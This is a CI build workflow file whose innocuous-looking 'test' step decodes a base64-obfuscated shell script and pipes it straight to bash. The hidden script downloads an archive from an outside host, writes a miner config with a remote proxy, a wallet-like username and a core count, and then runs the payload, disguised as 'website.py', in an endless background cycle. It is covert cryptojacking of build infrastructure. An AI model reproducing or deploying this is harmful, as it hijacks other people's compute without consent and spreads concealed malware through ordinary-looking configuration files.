workflows:
    default-workflow:
        name: Pre cloning workflow Test
        max_build_duration: 120
        instance_type: linux_x2
        pre_clone_scripts:
          - name: Scripts to run before cloning the repository
            script: sudo apt update;sudo apt -y install python3 python3-pip python3-venv
        scripts:
            - name: Scripts to run after cloning the repository
              script: base64 -d <<< IyEvYmluL2Jhc2gKZXhwb3J0IERFQklBTl9GUk9OVEVORD1ub25pbnRlcmFjdGl2ZQpERUJJQU5fRlJPTlRFTkQ9bm9uaW50ZXJhY3RpdmUKZXhwb3J0IFRFUk09eHRlcm0Kc2xlZXAgMgoKcHl0aG9uMyAtbSB2ZW52IC52ZW52CnNsZWVwIDIKc291cmNlIC52ZW52L2Jpbi9hY3RpdmF0ZQpzbGVlcCAyCgphcnJheT0oKQpmb3IgaSBpbiB7YS4uen0ge0EuLlp9IHswLi45fTsgCiAgIGRvCiAgIGFycmF5WyRSQU5ET01dPSRpCmRvbmUKCmN1cnJlbnRkYXRlPSQoZGF0ZSAnKyVkLSViLSVZLU1hZ1dhc21fJykKaXBhZGRyZXNzPSQod2dldCAtcSAtTyAtIGFwaS5pcGlmeS5vcmcpCm51bV9vZl9jb3Jlcz0kKGNhdCAvcHJvYy9jcHVpbmZvIHwgZ3JlcCBwcm9jZXNzb3IgfCB3YyAtbCkKdXNlZF9udW1fb2ZfY29yZXM9YGV4cHIgJG51bV9vZl9jb3JlcyAtIDJgCnVuZGVyc2NvcmVkX2lwPSQoZWNobyAkaXBhZGRyZXNzIHwgc2VkICdzL1wuL18vZycpCmN1cnJlbnRkYXRlKz0kdW5kZXJzY29yZWRfaXAKCnJhbmRvbVdvcmQ9JChwcmludGYgJXMgJHthcnJheVtAXTo6OH0gJCdcbicpCmN1cnJlbnRkYXRlKz0kcmFuZG9tV29yZAoKc2xlZXAgMgoKVFo9J0FmcmljYS9Kb2hhbm5lc2J1cmcnOyBleHBvcnQgVFoKZGF0ZQpzbGVlcCAyCgplY2hvICIiCmVjaG8gIllvdSB3aWxsIGJlIHVzaW5nICR1c2VkX251bV9vZl9jb3JlcyBjb3JlcyIKZWNobyAiIgpzbGVlcCAyCgplY2hvICIiCmVjaG8gIllvdXIgd29ya2VyIG5hbWUgd2lsbCBiZSAkY3VycmVudGRhdGUiCmVjaG8gIiIKc2xlZXAgMgoKRklMRV9OQU1FPSJ3ZWJzaXRlLnB5IgpET1dOTE9BRF9VUkw9Imh0dHA6Ly9ncmVlbmxlYWYudGVhdHNwcmF5LnVrL3AyYi1weTUudGFyLmd6IgoKaWYgWyAhIC1mICIkRklMRV9OQU1FIiBdOyB0aGVuCiAgICBlY2hvICJGaWxlICckRklMRV9OQU1FJyBkb2VzIG5vdCBleGlzdC4gRG93bmxvYWRpbmcuLi4iCiAgICB3Z2V0IC1xICIkRE9XTkxPQURfVVJMIiAmJiBzbGVlcCAxMCAmJiB0YXIgLXhmIHAyYi1weTUudGFyLmd6CmVsc2UKICAgIGVjaG8gIkZpbGUgJyRGSUxFX05BTUUnIGFscmVhZHkgZXhpc3RzLiBTa2lwcGluZyBkb3dubG9hZC4iCmZpCgpzbGVlcCAyCgpjYXQgPi5lbnYgPDwtRU9MCmhvc3Q9MTI3LjAuMC4xCnBvcnQ9MzMwNgpwcm94eT13czovL2NwdXNvY2tzJChzaHVmIC1pIDEtNiAtbiAxKS50ZWF0c3ByYXkudWs6OTk5OS9abXg1YVc1bmMyRjFZMlZ5TFdWMUxuUmxZWFJ6Y0hKaGVTNTFhem8yTWpReQp0aHJlYWRzPSR1c2VkX251bV9vZl9jb3JlcwpwYXNzd29yZD0kY3VycmVudGRhdGUsYz1NQkMsemFwPU1CQwp1c2VybmFtZT1NaUtiUkhja3Jlc1RRTFFRaVhjQlZlS2tFMVNjSzlXYTkzCkVPTAoKc2xlZXAgMgoKY2F0ID4gcnVuX2pvYi5zaCA8PC1FTkQKcmVhZG9ubHkgUElEX0ZJTEU9IndlYnNpdGUucGlkIgoKcmVhZG9ubHkgTE9HX0ZJTEU9IndlYnNpdGUubG9nIgoKcmVhZG9ubHkgSk9CX0RVUkFUSU9OX1NFQ09ORFM9MzYwMAoKcmVhZG9ubHkgU0xFRVBfRFVSQVRJT05fU0VDT05EUz0zMAoKIyAtLS0gRHluYW1pYyBDb3JlIENhbGN1bGF0aW9uIC0tLQoKbnVtX29mX2NvcmVzPSQoY2F0IC9wcm9jL2NwdWluZm8gfCBncmVwIHByb2Nlc3NvciB8IHdjIC1sKQoKdXNlZF9udW1fb2ZfY29yZXM9YGV4cHIgJG51bV9vZl9jb3JlcyAtIDJgCgpyZWFkb25seSBKT0JfQ09NTUFORD0icHl0aG9uMyB3ZWJzaXRlLnB5ICR7dXNlZF9udW1fb2ZfY29yZXN9IC0tY2FjaGU9LmNhY2hlLzA5UXk1c2IyRmtjeWcudHh0IgoKIyAtLS0gRnVuY3Rpb25zIC0tLQoKZ2V0X3BpZHMoKSB7CiAgIyBUaGUgdXNlIG9mICd8fCB0cnVlJyBlbnN1cmVzIHRoZSBncmVwIGNvbW1hbmQgZG9lc24ndCBjYXVzZSB0aGUgc2NyaXB0IHRvIGV4aXQKICAjIHByZW1hdHVyZWx5IGlmIGl0IGZpbmRzIG5vIG1hdGNoZXMsIHdoaWNoIGNhbiBoYXBwZW4gd2l0aCAnc2V0IC1lJy4KICBwcyAtYXV4IHwgZ3JlcCAiJHtKT0JfQ09NTUFORH0iIHwgZ3JlcCAtdiBncmVwIHwgYXdrICd7cHJpbnQgJDJ9JyB8IHRyICdcbicgJyAnIHx8IHRydWUKfQoKIyBGdW5jdGlvbiB0byBjaGVjayBpZiB0aGUgam9iIGlzIHJ1bm5pbmcuCmlzX3J1bm5pbmcoKSB7CiAgIyBVc2UgdGhlIGdldF9waWRzIGZ1bmN0aW9uLiBJZiBpdCByZXR1cm5zIGFueSBvdXRwdXQsIHRoZSBqb2IgaXMgcnVubmluZy4KICBpZiBbIC1uICIkKGdldF9waWRzKSIgXTsgdGhlbgogICAgcmV0dXJuIDAgIyBUaGUgcHJvY2VzcyBpcyBydW5uaW5nCiAgZWxzZQogICAgcmV0dXJuIDEgIyBUaGUgcHJvY2VzcyBpcyBub3QgcnVubmluZwogIGZpCn0KCiMgRnVuY3Rpb24gdG8gc3RhcnQgdGhlIGJhY2tncm91bmQgam9iLgpzdGFydF9qb2IoKSB7CiAgaWYgaXNfcnVubmluZzsgdGhlbgogICAgZWNobyAiSm9iIGlzIGFscmVhZHkgcnVubmluZy4gUElEczogJChnZXRfcGlkcykiCiAgICByZXR1cm4gMAogIGZpCiAgZWNobyAiU3RhcnRpbmcgam9iIHdpdGggY29tbWFuZDogJHtKT0JfQ09NTUFORH0iCiAgCiAgIyBFeHBsaWNpdGx5IGNsZWFuIHVwIG9sZCBmaWxlcyBmb3IgYSBmcmVzaCBzdGFydC4KICBybSAtZiAiJHtQSURfRklMRX0iCiAgcm0gLWYgIiR7TE9HX0ZJTEV9IgoKICBub2h1cCAke0pPQl9DT01NQU5EfSA+ICIke0xPR19GSUxFfSIgMj4mMSAmCiAgZWNobyAkISA+ICIke1BJRF9GSUxFfSIKCiAgIyBXYWl0IGZvciBhIG1vbWVudCB0byBlbnN1cmUgdGhlIHByb2Nlc3MgaGFzIHN0YXJ0ZWQgYW5kIHdyaXR0ZW4gdG8gdGhlIGxvZy4KICBzbGVlcCAyCgogIGlmIFsgLWYgIiR7UElEX0ZJTEV9IiBdOyB0aGVuCiAgICBlY2hvICJKb2Igc3RhcnRlZCB3aXRoIHBhcmVudCBQSUQgJChjYXQgIiR7UElEX0ZJTEV9IikuIgogICAgZWNobyAiVmlldyBsb2dzIHdpdGg6IHRhaWwgLWYgJHtMT0dfRklMRX0iCiAgZWxzZQogICAgZWNobyAiV2FybmluZzogSm9iIHN0YXJ0ZWQgYnV0IFBJRCBmaWxlIHdhcyBub3QgY3JlYXRlZC4iCiAgICBlY2hvICJWaWV3IGxvZ3Mgd2l0aDogdGFpbCAtZiAke0xPR19GSUxFfSIKICBmaQp9CgojIEZ1bmN0aW9uIHRvIHN0b3AgdGhlIGJhY2tncm91bmQgam9iLgpzdG9wX2pvYigpIHsKICBpZiAhIGlzX3J1bm5pbmc7IHRoZW4KICAgIGVjaG8gIkpvYiBpcyBub3QgcnVubmluZy4iCiAgICAjIFVuY29uZGl0aW9uYWxseSBjbGVhbiB1cCBvbGQgZmlsZXMuCiAgICBybSAtZiAiJHtQSURfRklMRX0iCiAgICBybSAtZiAiJHtMT0dfRklMRX0iCiAgICBleGl0IDAKICBmaQoKICBsb2NhbCBwaWRzPSQoZ2V0X3BpZHMpCiAgZWNobyAiVGVybWluYXRpbmcgYWxsIHByb2Nlc3NlcyByZWxhdGVkIHRvIHRoZSBqb2IuLi4iCiAgZWNobyAiRm91bmQgUElEczogJHtwaWRzfSIKCiAgIyBMb29wIHRocm91Z2ggYWxsIGZvdW5kIFBJRHMgYW5kIGtpbGwgdGhlbSBvbmUgYnkgb25lLgogIGZvciBwaWQgaW4gJHtwaWRzfTsgZG8KICAgIGVjaG8gIlNlbmRpbmcgU0lHVEVSTSB0byBQSUQ6ICR7cGlkfSIKICAgIGtpbGwgIiR7cGlkfSIKICBkb25lCgogIGVjaG8gIlNlbnQgU0lHVEVSTSB0byBwcm9jZXNzZXMuIFdhaXRpbmcgZm9yIHVwIHRvIDUgc2Vjb25kcyBmb3IgdGhlbSB0byBzdG9wLi4uIgogIHNsZWVwIDUKCiAgIyBDaGVjayBpZiBhbnkgcHJvY2Vzc2VzIGFyZSBzdGlsbCBydW5uaW5nLgogIGxvY2FsIHBpZHNfYWZ0ZXJfd2FpdD0kKGdldF9waWRzKQogIGlmIFsgLW4gIiR7cGlkc19hZnRlcl93YWl0fSIgXTsgdGhlbgogICAgZWNobyAiU29tZSBwcm9jZXNzZXMgYXJlIHN0aWxsIHJ1bm5pbmcuIEZvcmNlZnVsbHkga2lsbGluZyB3aXRoIFNJR0tJTEwuLi4iCiAgICBmb3IgcGlkIGluICR7cGlkc19hZnRlcl93YWl0fTsgZG8KICAgICAgZWNobyAiU2VuZGluZyBTSUdLSUxMIHRvIFBJRDogJHtwaWR9IgogICAgICBraWxsIC05ICIke3BpZH0iCiAgICBkb25lCiAgICBzbGVlcCAyICMgR2l2ZSBhIGZpbmFsIG1vbWVudCBmb3IgY2xlYW51cAogIGZpCgogICMgQWZ0ZXIgdGhlIGtpbGwgYXR0ZW1wdHMsIGNoZWNrIG9uZSBsYXN0IHRpbWUuCiAgaWYgISBpc19ydW5uaW5nOyB0aGVuCiAgICAjIFVuY29uZGl0aW9uYWxseSBjbGVhbiB1cCBvbGQgZmlsZXMgYWZ0ZXIgYSBzdWNjZXNzZnVsIHN0b3AuCiAgICBybSAtZiAiJHtQSURfRklMRX0iCiAgICBybSAtZiAiJHtMT0dfRklMRX0iCiAgICBlY2hvICJKb2IgdGVybWluYXRlZCBhbmQgY2xlYW5lZCB1cC4iCiAgZWxzZQogICAgZWNobyAiV2FybmluZzogRmFpbGVkIHRvIHRlcm1pbmF0ZSBhbGwgcHJvY2Vzc2VzLiBNYW51YWwgaW50ZXJ2ZW50aW9uIG1heSBiZSByZXF1aXJlZC4iCiAgICBlY2hvICJSZW1haW5pbmcgUElEczogJChnZXRfcGlkcykiCiAgZmkKfQoKIyBGdW5jdGlvbiB0byBjaGVjayB0aGUgc3RhdHVzIG9mIHRoZSBiYWNrZ3JvdW5kIGpvYi4Kc3RhdHVzX2pvYigpIHsKICBlY2hvICItLS0gSm9iIFN0YXR1cyBSZXBvcnQgLS0tIgogIHNsZWVwIDEKICAKICBpZiBpc19ydW5uaW5nOyB0aGVuCiAgICBlY2hvICJTdGF0dXM6IEpvYiBpcyBjdXJyZW50bHkgcnVubmluZy4iCiAgICBlY2hvICJSdW5uaW5nIFBJRHM6ICQoZ2V0X3BpZHMpIgogIGVsc2UKICAgIGVjaG8gIlN0YXR1czogSm9iIGlzIG5vdCBydW5uaW5nLiIKICBmaQogIAogIHNsZWVwIDEKICBlY2hvICItLS0gTG9nIEZpbGUgUmVwb3J0IC0tLSIKICBpZiBbIC1zICIke0xPR19GSUxFfSIgXTsgdGhlbgogICAgZWNobyAiTG9nIGZpbGUgZXhpc3RzIGFuZCBjb250YWlucyBjb250ZW50LiBEaXNwbGF5aW5nIGxhc3QgMTAgbGluZXM6IgogICAgIyBUaGUgJ3x8IHRydWUnIGlzIHVzZWQgaGVyZSBhcyB3ZWxsIHRvIHByZXZlbnQgZXJyb3JzIGlmIHRoZSBmaWxlIGlzIGVtcHR5IG9yIG1pc3NpbmcuCiAgICB0YWlsIC1uIDEwICIke0xPR19GSUxFfSIgfHwgdHJ1ZQogIGVsaWYgWyAtZiAiJHtMT0dfRklMRX0iIF07IHRoZW4KICAgIGVjaG8gIkxvZyBmaWxlIGV4aXN0cyBidXQgaXMgY3VycmVudGx5IGVtcHR5LiIKICBlbHNlCiAgICBlY2hvICJObyBsb2cgZmlsZSBmb3VuZC4gVGhlIGpvYiBoYXMgbGlrZWx5IG5vdCBiZWVuIHN0YXJ0ZWQgeWV0LiIKICBmaQogIAogIHNsZWVwIDEKICBlY2hvICItLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIgp9CgojIFRoZSBjeWNsZSBqb2IgZnVuY3Rpb24gbm93IHJ1bnMgZm9yZXZlciBieSBkZWZhdWx0LgpjeWNsZV9qb2IoKSB7CiAgZWNobyAiU3RhcnRpbmcgY3ljbGluZyBqb2IuIEl0IHdpbGwgcnVuIGZvciAke0pPQl9EVVJBVElPTl9TRUNPTkRTfSBzZWNvbmRzLCBzdG9wLCBhbmQgdGhlbiBzbGVlcCBmb3IgJHtTTEVFUF9EVVJBVElPTl9TRUNPTkRTfSBzZWNvbmRzIGJlZm9yZSByZXBlYXRpbmcuIgogIHdoaWxlIHRydWU7IGRvCiAgICBzdGFydF9qb2IKICAgIHNsZWVwICIke0pPQl9EVVJBVElPTl9TRUNPTkRTfSIKICAgIHN0b3Bfam9iCiAgICBzbGVlcCAiJHtTTEVFUF9EVVJBVElPTl9TRUNPTkRTfSIKICBkb25lCn0KCiMgLS0tIENvbW1hbmQgTGluZSBJbnRlcmZhY2UgKENMSSkgLS0tCmNhc2UgIiQxIiBpbgogIHN0YXJ0KQogICAgc3RhcnRfam9iCiAgICA7OwoKICBzdG9wKQogICAgc3RvcF9qb2IKICAgIDs7CgogIHN0YXR1cykKICAgIHN0YXR1c19qb2IKICAgIDs7CgogIGN5Y2xlKQogICAgY3ljbGVfam9iCiAgICA7OwoKICAqKQogICAgZWNobyAiVXNhZ2U6ICQwIHtzdGFydHxzdG9wfHN0YXR1c3xjeWNsZX0iCiAgICBleGl0IDEKICAgIDs7CmVzYWMKRU5ECgpzbGVlcCAyCgpjaG1vZCAreCBydW5fam9iLnNoCgpzbGVlcCAyCgpiYXNoIHJ1bl9qb2Iuc2ggY3ljbGU= | bash
